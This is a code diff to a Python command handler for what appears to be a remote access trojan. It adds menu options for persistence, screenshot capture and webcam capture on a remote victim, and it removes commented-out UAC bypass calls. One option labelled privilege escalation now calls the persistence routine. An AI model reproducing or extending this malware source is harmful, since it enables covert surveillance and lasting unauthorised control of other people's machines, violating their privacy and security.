@@ -1,6 +1,9 @@
 from core.features.command import *
 from core.features.transfer_files import *
 from core.features.privilage import *
+from core.features.persistance import *
+from core.features.monitoring import *
+
 
 def handleConnection(my_socket):
     print("[+] Handling Connection")
@@ -24,12 +27,17 @@ def handleConnection(my_socket):
             my_socket.change_dir()
         elif user_option == "5":
             print("\t\t[+] Privilage escalation")
-            # execute(my_socket)
-            # try_UAC_bypass(my_socket)
-            try_elevating()
+            become_persistant(my_socket)
         elif user_option == "6":
-            print("\t\t[+] Advanced Command Execution")
-            run_command_advanced(my_socket)
+            print("\t\t[+] Becoming Persistant")
+            become_persistant(my_socket)
+
+        elif user_option == "7":
+            print("\t\t Taking Screenshot")
+            capture_screenshot(my_socket)
+        elif user_option=="8":
+            print("\t\t[+] Capturing webcam")
+            capturing_webcam(my_socket)
         elif user_option == "99":
             print("\t\t[-] Exiting the main loop")
             keep_alive = False
